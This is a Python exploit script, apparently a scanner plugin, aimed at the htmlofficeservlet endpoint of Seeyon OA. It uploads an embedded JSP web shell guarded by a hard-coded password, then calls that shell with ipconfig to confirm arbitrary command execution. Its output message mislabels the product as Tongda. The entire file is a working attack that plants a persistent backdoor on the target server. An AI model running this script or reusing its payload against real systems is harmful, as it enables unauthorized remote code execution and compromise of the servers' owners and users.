import requests
from lib.get_normal_url import get_standard_url
headers = {
    "Cache-Control": "max-age=0",
    "Content-Type": "application/x-www-form-urlencoded",
    "User - Agent": "Mozilla/5.0(Windows NT 10.0;Win64;x64) AppleWebKit/537.36(KHTML, likeGecko) Chrome/92.0.4515.159 Safari/537.36",
    "Accept-Encoding": "gzip, deflate",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "Connection": "close"
}
def poc(target):
    try:
        target = get_standard_url(target)
        reaurl = target + "/seeyon/htmlofficeservlet"
        payload = """
        DBSTEP V3.0     355             0               666             DBSTEP=OKMLlKlV
        OPTION=S3WYOSWLBSGr
        currentUserId=zUCTwigsziCAPLesw4gsw4oEwV66
        CREATEDATE=wUghPB3szB3Xwg66
        RECORDID=qLSGw4SXzLeGw4V3wUw3zUoXwid6
        originalFileId=wV66
        originalCreateDate=wUghPB3szB3Xwg66
        FILENAME=qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdN1liN4KXwiVGzfT2dEg6
        needReadFile=yRWZdAS6
        originalCreateDate=wLSGP4oEzLKAz4=iz=66
        <%@ page language="java" import="java.util.*,java.io.*" pageEncoding="UTF-8"%><%!public static String excuteCmd(String c) {StringBuilder line = new StringBuilder();try {Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));String temp = null;while ((temp = buf.readLine()) != null) {line.append(temp+"\n");}buf.close();} catch (Exception e) {line.append(e.getMessage());}return line.toString();} %><%if("asasd3344".equals(request.getParameter("pwd"))&&!"".equals(request.getParameter("cmd"))){out.println("<pre>"+excuteCmd(request.getParameter("cmd")) + "</pre>");}else{out.println(":-)");}%>6e4f045d4b8506bf492ada7e3390d7ce
        """
        req1 = requests.post(url=reaurl, data=payload, headers=headers)
        shell_url = target + "/seeyon/test123456.jsp?pwd=asasd3344&cmd=ipconfig"
        req2 = requests.get(shell_url,headers=headers)
        if "Windows IP" in req2.text:
            print("\033[0;31m 存在通达htmlofficeservlet命令执行："+shell_url)
    except:
        pass
